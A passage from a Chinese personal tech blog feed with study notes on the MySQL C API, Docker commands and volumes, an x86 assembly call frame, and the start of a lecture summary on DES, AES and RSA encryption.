class="line"><span class="comment">        MYSQL_ROW</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 函数在调用时，最初指向的行是结果集的第一行之前。也就是说，当你第一次调用 mysql_fetch_row() 时，它会移动到结果集的第一行并返回该行的数据。 */</span></span><br><span class="line">MYSQL_ROW <span class="title function_">mysql_fetch_row</span><span class="params">(MYSQL_RES* result)</span>;</span><br><span class="line">参数: </span><br><span class="line">    - result: 通过查询得到的结果集</span><br><span class="line">返回值: </span><br><span class="line">    - 成功: 得到了当前记录字符串数组，每个字符串是对应字段的值</span><br><span class="line">    - 失败: <span class="literal">NULL</span>, 说明数据已经读完了</span><br></pre></td></tr></table></figure><p><strong><code>mysql_fetch_lengths()</code></strong></p><p>获取当前指向的记录所有字段值的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">返回结果集内当前行的列的长度:</span></span><br><span class="line"><span class="comment">    1. 如果打算复制字段值，使用该函数能避免调用strlen()。</span></span><br><span class="line"><span class="comment">    2. 如果结果集包含二进制数据，必须使用该函数来确定数据的大小，原因在于，对于包含&#x27;\0&#x27;字符的任何字段，strlen()将返回错误的结果。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *<span class="title function_">mysql_fetch_lengths</span><span class="params">(MYSQL_RES *result)</span>;</span><br><span class="line">参数: </span><br><span class="line">    - result: 通过查询得到的结果集</span><br><span class="line">返回值:</span><br><span class="line">    - 无符号长整数的数组表示各列的大小。如果出现错误，返回<span class="literal">NULL</span>。</span><br></pre></td></tr></table></figure><p>对记录的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MYSQL_ROW row;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>* lengths;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> num_fields;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印当前记录所有字段值的长度,按字节算</span></span><br><span class="line">row = mysql_fetch_row(result);</span><br><span class="line"><span class="keyword">if</span> (row != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    num_fields = mysql_num_fields(result);</span><br><span class="line">    lengths = mysql_fetch_lengths(result);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Column %u is %lu bytes in length.\n&quot;</span>, i, lengths[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取并打印每一行</span></span><br><span class="line"><span class="type">int</span> num_fields = mysql_num_fields(res);</span><br><span class="line"><span class="keyword">while</span> ((row = mysql_fetch_row(res))) &#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, row[i] ? row[i] : <span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>资源回收&#x2F;关闭连接</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为 MYSQL_RES 对象也是malloc出来的，所以不用的时候就释放掉</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mysql_free_result</span><span class="params">(MYSQL_RES* result)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接，释放在堆区的 MYSQL 对象的内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mysql_close</span><span class="params">(MYSQL* mysql)</span>;</span><br></pre></td></tr></table></figure><p><strong>字符编码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看某个MYSQL对象对结果集的字符编码</span></span><br><span class="line"><span class="comment">// 返回字符编码的字符串，比如说 &quot;utf8&quot;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* <span class="title function_">mysql_character_set_name</span><span class="params">(MYSQL* mysql)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置MYSQL对象的字符编码</span></span><br><span class="line"><span class="comment">// 第一个参数指定MYSQL对象，第二个参数指定字符集编码类型，比如说 &quot;utf8&quot;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mysql_set_character_set</span><span class="params">(MYSQL* mysql, <span class="type">char</span>* csname)</span></span><br></pre></td></tr></table></figure><p><strong>事务操作</strong></p><p>我们处理数据不是说添加一次就算完了，可能需要添加、删除、查找等一系列操作。这一系列操作序列在<code>mysql</code>中就称作<strong>事务</strong>，<code>mysql</code>中还提供对事务的回滚(<strong>roll back</strong>)，就是说事务当中的某次操作失败了，就可以回滚到事务处理前的状态，回到对数据库什么也没动的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">事务 ---- SELECT ---- INSERT ---- DELETE</span><br><span class="line">    ^</span><br><span class="line">roll back</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysql中默认会进行事务的提交</span></span><br><span class="line"><span class="comment">// 因为自动提交事务, 会对我们的操作造成影响</span></span><br><span class="line"><span class="comment">// 如果我们操作的步骤比较多, 集合的开始和结束需要用户自己去设置, 需要改为手动方式提交事务</span></span><br><span class="line"><span class="comment">// 这个函数就会发送关闭自动提交指令给mysql服务器</span></span><br><span class="line">my_bool <span class="title function_">mysql_autocommit</span><span class="params">(MYSQL *mysql, my_bool mode)</span> </span><br><span class="line">参数:</span><br><span class="line">    如果模式为“1”，启用autocommit模式；如果模式为“0”，禁止autocommit模式。</span><br><span class="line">返回值</span><br><span class="line">    如果成功，返回0，如果出现错误，返回非0值。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事务提交</span></span><br><span class="line"><span class="comment">// 发送提交指令给mysql服务器</span></span><br><span class="line">my_bool <span class="title function_">mysql_commit</span><span class="params">(MYSQL* mysql)</span>;</span><br><span class="line">返回值: 成功: <span class="number">0</span>, 失败: 非<span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 数据回滚</span></span><br><span class="line"><span class="comment">// 发送数据回滚指令给mysql服务器</span></span><br><span class="line">my_bool <span class="title function_">mysql_rollback</span><span class="params">(MYSQL* mysql)</span> </span><br><span class="line">返回值: 成功: 0, 失败: 非0</span><br></pre></td></tr></table></figure><p><strong>打印错误信息</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回错误信息</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* <span class="title function_">mysql_error</span><span class="params">(MYSQL* mysql)</span>;</span><br><span class="line"><span class="comment">// 返回错误编号</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">mysql_errno</span><span class="params">(MYSQL* mysql)</span>;</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* host = <span class="string">&quot;192.168.66.1&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* db = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> port = <span class="number">3306</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* unix_socket = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> client_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    MYSQL* mysql = mysql_init(<span class="literal">NULL</span>);</span><br><span class="line">    mysql = mysql_real_connect(mysql, host, user, passwd, db, port, unix_socket, client_flag);</span><br><span class="line">    <span class="keyword">if</span> (mysql != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;连接成功\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;连接失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mysql_query(mysql, <span class="string">&quot;SELECT * FROM user&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;查询成功\n&quot;</span>);</span><br><span class="line">        MYSQL_RES* result = mysql_store_result(mysql);</span><br><span class="line">        <span class="type">int</span> num = mysql_num_fields(result);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;字段数为: %d\n&quot;</span>, num);</span><br><span class="line">        MYSQL_FIELD* fields = mysql_fetch_fields(result);</span><br><span class="line">        MYSQL_ROW row;</span><br><span class="line">        <span class="keyword">while</span> ((row = mysql_fetch_row(result))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: %s\n&quot;</span>, fields[i].name, row[i] ? row[i] : <span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;查询失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close(mysql);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2024/08/09/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/09/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>docker</strong> 本身就跟<code>mysql</code>服务器一样，通过接收来自<code>shell</code>的命令来执行一些动作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--name mysql \</span><br><span class="line">-p 3305:3306 \</span><br><span class="line">-e TZ=Asiz/Shanghai \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=root\</span><br><span class="line">mysql</span><br></pre></td></tr></table></figure><p><code>docker run &lt;repositor&gt;:&lt;tag&gt;</code>命令详解</p><ul><li><p><code>docker run</code>启动并运行一个容器</p></li><li><p><code>-d</code>表示以<strong>分离模式</strong>（detached mode）运行容器。使用该参数后，容器将在后台运行</p></li><li><p><code>--name</code>给容器起个名字，必须唯一</p></li><li><p><code>-p &lt;host-port&gt;:&lt;docker-port&gt;</code>端口映射，左边是宿主机的端口可更改，右边是容器的端口不可更改，因为已做出来的镜像固定了这个端口</p></li><li><p><code>-e &lt;KEY&gt;=&lt;VALUE&gt;</code>设置容器的环境变量</p></li><li><p>最后就是指定一个镜像。镜像名称由两部分组成：[<code>repository</code>]:[<code>tag</code>]，其中<code>repository</code>是镜像名，<code>tag</code>是镜像的版本，默认是<code>latest</code>表示镜像的最新版本</p></li></ul><p><code>docker</code>对<strong>容器</strong>操作的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">docker ps # 显示正在运行的容器</span><br><span class="line">docker ps -a # 显示所有容器，包括停止的容器</span><br><span class="line"></span><br><span class="line">docker log &lt;name&gt; # 显示&lt;name&gt;容器的日志</span><br><span class="line">docker log -f &lt;name&gt; # f表follow，跟踪显示&lt;name&gt;容器的日志，ctrl+c退出</span><br><span class="line"></span><br><span class="line">docker exec -it &lt;name&gt; &lt;command&gt; [&lt;args&gt;] # 在&lt;name&gt;容器中执行&lt;command&gt;命令跟上参数</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i参数表示以交互模式运行 -t参数表示为容器分配一个终端</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例：docker <span class="built_in">exec</span> -it nginx bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    docker <span class="built_in">exec</span> -it mysql -uroot -p</span></span><br><span class="line"></span><br><span class="line">docker rm &lt;name&gt; # 删除&lt;name&gt;容器,但是不能删除运行中的容器</span><br><span class="line">docker rm -f &lt;name&gt; # 强制删除，运行中的容器也能删除</span><br><span class="line"></span><br><span class="line">docker stop &lt;name&gt; # 停止&lt;name&gt;容器</span><br><span class="line">docker start &lt;name&gt; # 将&lt;name&gt;容器从stop状态转为运行状态</span><br><span class="line"></span><br><span class="line">docker inspect &lt;name&gt; # 查看&lt;name&gt;容器的详细信息</span><br></pre></td></tr></table></figure><p><code>docker</code>对<strong>镜像</strong>操作的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker images # 显示本地的镜像</span><br><span class="line"></span><br><span class="line">docker rmi &lt;image_name&gt;:&lt;tag&gt; # 删除指定版本的镜像</span><br><span class="line"></span><br><span class="line">docker save -o &lt;outputfile&gt; &lt;image_name&gt;:&lt;tag&gt; # 将指定版本的镜像输出为文件</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例：docker save -o nginx.tar nginx:latest</span></span><br><span class="line"></span><br><span class="line">docker load -i &lt;filename&gt; # 将上面的输出文件加载为镜像</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例: docker load -i nginx.tar</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果某个命令参数不清楚可以用--<span class="built_in">help</span>详知，比如 docker save --<span class="built_in">help</span></span></span><br></pre></td></tr></table></figure><p><code>volume</code><strong>数据卷</strong>，是<code>docker</code>的一种逻辑概念，它能够与宿主机的某个目录进行关联，然后在创建容器时将容器内某个目录与这个数据卷也进行关联，<code>docker</code>就能通过这个数据卷完成宿主机目录与容器内目录的同步。注意，容器只有在创建时才能进行数据卷挂载，创建后就不行了，在创建容器时如果指定的数据卷不存在会创建一个指定名字的数据卷，并且关联的宿主机目录在<code>/var/lib/docker/volumes/&lt;volume_name&gt;/_data</code>目录下</p><p>在<code>docker run</code>命令下添加<code>-v</code>参数可以将容器内指定目录与数据卷关联(挂载)，比如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nginx -v html:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure><p>就会创建一个<code>html</code>数据卷，并将创建的<code>nginx</code>容器内的<code>/usr/share/nginx/html</code>与<code>html</code>数据卷相关联，并且这个数据卷与宿主机的<code>/var/lib/docker/volumes/html/_data</code>目录相关联</p><p><code>docker</code>挂载的方式有两种一种是通过数据卷挂载，叫<code>volume</code>；一种是直接与宿主机目录挂载，叫<code>bind</code></p><p><code>docker</code>对数据卷操作的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">都是以volume打头</span></span><br><span class="line">docker volume --help # 如果不清楚与数据卷有关的操作可以用这个命令</span><br><span class="line">docker volume cerate # 创建数据卷</span><br><span class="line">docker volume ls # 查看所有数据卷</span><br><span class="line">docker volume rm # 删除指定数据卷</span><br><span class="line">docker volume inspect # 查看某个数据卷的详情</span><br><span class="line">docker volume prune # 清除数据卷</span><br></pre></td></tr></table></figure><p>此外还可以不通过数据卷，直接将宿主机目录与容器内目录相关联</p><p>在执行<code>docker run</code>命令时，使用<code>-v 本地目录:容器内目录</code>可以完成本地目录挂载<br>本地目录必须以<code>/</code>或<code>./</code>开头，如果直接以名称开头，会被识别为数据卷而非本地目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nginx -v /home/kali/html:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure><p>此外还可以添加<code>ro</code>和<code>rw</code>来控制容器的读写权限，毕竟限制宿主机的读写权限也没什么意义</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nginx -v html:/usr/share/nginx/html:ro nginx # 容器对数据卷只有读权限</span><br><span class="line">docker run --name nginx -v html:/usr/share/nginx/html:ro nginx # 容器对数据卷可读可写</span><br></pre></td></tr></table></figure><p><code>docker</code>可以进行<strong>网络</strong>操作，创建一个网络，其实就是创建一个内部的网络号和子网掩码，然后分配容器主机号，组成容器的内部<code>ip</code>地址。创建一个自定义网络，容器在自定义网络之间就可以通过容器名互相访问。</p><p><code>docker</code>对<strong>网络</strong>操作的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">都是以network打头</span></span><br><span class="line">docker network --help # 如果不清楚与网络有关的操作可以用这个命令</span><br><span class="line">docker netword cerate # 创建一个网络</span><br><span class="line">docker network ls # 查看所有数据卷</span><br><span class="line">docker network rm # 删除指定数据卷</span><br><span class="line">docker network prune # 清除数据卷</span><br><span class="line">docker network connect &lt;容器&gt; &lt;网络&gt; # 使指定容器接入某网络</span><br><span class="line">docker network disconnect # 使指定容器离开某网络</span><br><span class="line">docker network inspect # 查看网络详细信息</span><br></pre></td></tr></table></figure><p><strong>Dockerfile</strong>语法</p><table><thead><tr><th align="center">指令</th><th align="center">说明</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>FROM</code></td><td align="center">指定基础镜像</td><td align="center"><code>FROM centos:6</code></td></tr><tr><td align="center"><code>ENV</code></td><td align="center">设置环境变量，可在后面指令使用</td><td align="center"><code>ENV key value</code></td></tr><tr><td align="center"><code>COPY</code></td><td align="center">拷贝本地文件到镜像的指定目录</td><td align="center"><code>COPY ./jre11.tar.gz /tmp</code></td></tr><tr><td align="center"><code>RUN</code></td><td align="center">执行<code>Linux</code>的<code>shell</code>命令，一般是安装过程命令</td><td align="center"><code>RUN tar -zxvf /tmp/jre11.tar.gz &amp;&amp; EXPORT path=/tmp/jre11:$path</code></td></tr><tr><td align="center"><code>EXPOSE</code></td><td align="center">指定容器运行时监听的端口，是给镜像使用者看的</td><td align="center"><code>EXPOSE 8080</code></td></tr><tr><td align="center"><code>ENTRYPOINT</code></td><td align="center">镜像中应用的启动命令，容器运行时调用</td><td align="center"><code>ENTRYPOINT java -jar xx.jar</code></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &lt;image_name&gt;:&lt;tag&gt; &lt;Dockerfile_path&gt;</span><br></pre></td></tr></table></figure><p><code>Dockerfile</code>让<code>docker</code>知道一个镜像需要哪些基础镜像进行制作</p><p><code>docker-compose.yml</code>让<code>Docker Compose</code>知道一个项目需要怎么构建一些容器来构成子项目</p><p><img src="/../posts_img/docker%E5%AD%A6%E4%B9%A0/docker%E6%93%8D%E4%BD%9C.png" alt="00"></p><p><img src="/../posts_img/docker%E5%AD%A6%E4%B9%A0/volume.png" alt="01"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asm子函数调用精简结构</title>
      <link href="/2024/07/23/asm%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%B2%BE%E7%AE%80%E7%BB%93%E6%9E%84/"/>
      <url>/2024/07/23/asm%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%B2%BE%E7%AE%80%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">...</span><br><span class="line">push a</span><br><span class="line">push b</span><br><span class="line">call func</span><br><span class="line">...</span><br><span class="line">func:</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp ; 先push ebp再把ebp拉上来</span><br><span class="line">...</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">...</span><br><span class="line">leave ; mov esp, ebp; pop ebp 先把esp降下来再pop ebp</span><br><span class="line">ret ; 此时esp指向的地方存储的应该是eip</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/asm%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%B2%BE%E7%AE%80%E7%BB%93%E6%9E%84/%E6%A0%88%E4%B8%AD%E7%9A%84esp%E5%92%8Cebp.png" alt="00"></p><p><img src="/../posts_img/asm%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%B2%BE%E7%AE%80%E7%BB%93%E6%9E%84/%E6%B1%87%E7%BC%96%E8%B0%83%E7%94%A8%E5%AD%90%E7%A8%8B%E5%BA%8F.png" alt="00"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【中科大计算机网络】网络安全</title>
      <link href="/2024/07/21/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AF%87/"/>
      <url>/2024/07/21/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>加密分为：**对称加密 **和 <strong>非对称加密</strong></p><p>如果加密的密钥和解密的密钥是一样的话，我们将这种加密体系称之为<strong>对称加密体系</strong><br>如果加密的密钥和解密的密钥不一样的话，我们将这种加密体系称之为<strong>非对称加密体系</strong>，或者说公开加密体系。</p><ul><li><p><strong>对称密钥密码学</strong>：发送方和接收方的密钥相同。</p></li><li><p><strong>公开密钥密码学</strong>：发送方使用接收方的公钥进行加密，接收方使用自己的私钥进行加密。</p></li><li><p>明文，<code>plaintext</code></p></li><li><p>密文，<code>ciphertext</code></p></li><li><p>message, <code>m</code></p></li></ul><hr><p>在对称加密体系中，假设 Alice 和 Bob 共享一个对称式的密钥 K<del>A-B</del>，则满足 m &#x3D; K<del>A-B</del>( K<del>A-B</del>(m) )，也就是<code>message</code>通过同一个密钥加密，通过同一个密钥解密。<strong>plaintext &#x3D; m，ciphertext &#x3D; K<del>A-B</del>(plaintext) ，plaintext &#x3D;  K<del>A-B</del>(ciphertext)，m &#x3D; plaintext</strong></p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/00.png" alt="00"></p><p><strong>DES</strong></p><p>对称密钥加密学中有一种加密方法，叫做<strong>DES(Data Encryption Standard)</strong></p><ul><li><strong>56-bit</strong> 对称密钥，<strong>64-bit</strong> 明文输入</li></ul><p>规则就是使用 56位的<code>key</code>对一串数据进行 64位成组加密。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/01.png" alt="01"></p><p>使<strong>DES</strong>更安全</p><ul><li>使用 3 个 <code>key</code>，3 重 <code>DES</code> 运算</li><li>密文分组成串技术</li></ul><p>密文成串技术如下图所示</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/02.png" alt="02"></p><p><strong>AES</strong></p><p><strong>AES(Advanced Encryption Standard)</strong>，其实就是<strong>DES</strong>的升级版</p><p>同样是成组加密，只不过它的明文是<strong>128-bit</strong>成组，而且密钥的长度可以选择<strong>128-bit</strong>、<strong>192-bit</strong>、<strong>256-bit</strong>，按照安全性要求选择</p><hr><p>然后就是非对称加密</p><p>用公钥进行加密，用私钥进行解密</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/cybersec/06.png" alt="06"></p><p><strong>RSA</strong></p><ol><li>选择两个质数 <code>p</code>，<code>q</code></li><li>用这两个质数得到两个数 <code>n = p * q</code>，<code>z = (p - 1) * (q - 1)</code></li><li>再找到两个数，用<code>z</code>再得到**<code>e</code><strong>，<code>e</code>与<code>z</code>互素，再用<code>e</code>得到</strong><code>d</code>**，满足 <strong><code>ed % z = 1</code></strong>，或者说 <code>ed - 1</code>能被<code>z</code>整除</li><li>得到数对 <strong>(n,e)</strong> 用于加密，<strong>(n,d)</strong> 用于解密</li></ol><p>最后</p><ul><li>加密公式为：c &#x3D; m^e^ mod 